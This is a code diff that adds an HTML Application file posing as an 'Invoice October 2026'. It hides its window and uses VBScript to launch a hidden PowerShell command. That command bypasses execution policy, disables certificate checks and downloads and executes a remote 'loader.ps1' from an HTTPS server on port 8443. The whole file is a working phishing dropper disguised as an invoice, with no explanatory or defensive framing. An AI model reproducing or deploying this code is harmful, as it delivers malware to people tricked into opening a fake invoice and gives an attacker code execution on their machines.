@@ -1,0 +1,12 @@
+<html>
+<head><title>Invoice October 2026</title>
+<HTA:APPLICATION WINDOWSTATE="minimize" SHOWINTASKBAR="no"/>
+<script language="VBScript">
+    On Error Resume Next
+    Set WshShell = CreateObject("WScript.Shell")
+    Dim cmd
+    cmd = "powershell.exe -NoP -W H -Exec Bypass -C ""[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.WebRequest]::DefaultWebProxy=$null;$wc=New-Object Net.WebClient;$wc.Proxy=$null;IEX $wc.DownloadString('https://192.168.56.100:8443/loader.ps1')"""
+    WshShell.Run cmd, 0, false
+    window.close()
+</script>
+</html>
